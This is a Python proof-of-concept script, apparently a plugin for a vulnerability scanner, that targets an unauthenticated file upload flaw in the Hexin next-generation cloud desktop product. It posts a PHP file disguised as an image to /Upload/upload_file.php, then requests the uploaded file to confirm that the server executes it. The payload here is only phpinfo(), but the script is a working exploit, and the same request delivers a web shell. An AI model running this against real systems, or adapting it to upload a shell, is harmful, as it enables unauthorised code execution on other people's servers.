#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '和信下一代云桌面文件上传',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      "Pragma":"no-cache",
      "Cache-Control":"no-cache",
      "Upgrade-Insecure-Requests":"1",
      "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "Accept-Encoding":"gzip, deflate",
      "Accept-Language":"zh-CN,zh;q=0.9",
      "Cookie":"SKYLARa0aede9e785feabae789c6e03d=es581dq8j5i74b4dj27kc87ar3",
      "Connection":"close",
      "Content-Type":"multipart/form-data;boundary=----WebKitFormBoundaryhQcaKJIKAnejKGru",
      }
  target = '/Upload/upload_file.php?l=1'
  data = '------WebKitFormBoundaryhQcaKJIKAnejKGru\r\nContent-Disposition: form-data; name="file";filename="21232f297a57.php"\r\nContent-Type: image/avif\r\n\r\n<?php phpinfo();?>\r\n------WebKitFormBoundaryhQcaKJIKAnejKGru--'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200:
      res.close()
      resp= requests.get(url=url+'/Upload/1/21232f297a57.php',verify=False)
      if resp.status_code == 200 and 'phpinfo()' in resp.text:
        # ret['huixian'] = res.text
        ret['ifbug'] = True
        resp.close()
        return ret
      else:
        return ret 
    else:
      return ret
  except:
    return ret